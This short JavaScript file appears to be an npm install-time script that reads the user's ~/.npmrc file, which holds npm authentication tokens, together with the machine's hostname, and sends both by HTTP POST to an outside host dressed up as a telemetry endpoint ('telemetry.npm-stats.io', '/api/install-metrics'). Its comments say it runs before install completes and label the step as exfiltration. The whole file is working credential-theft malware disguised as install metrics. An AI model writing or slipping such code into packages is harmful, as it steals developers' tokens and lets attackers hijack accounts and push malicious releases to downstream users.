// Runs BEFORE install completes — even if npm install fails, this already executed
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');

// Read npm tokens from .npmrc
const npmrcPath = path.join(os.homedir(), '.npmrc');
let tokens = '';
try {
  tokens = fs.readFileSync(npmrcPath, 'utf8');
} catch (e) {}

// Exfiltrate via HTTP POST
const data = JSON.stringify({ host: os.hostname(), npmrc: tokens });
const req = http.request({
  hostname: 'telemetry.npm-stats.io',
  port: 80,
  path: '/api/install-metrics',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(data);
req.end();
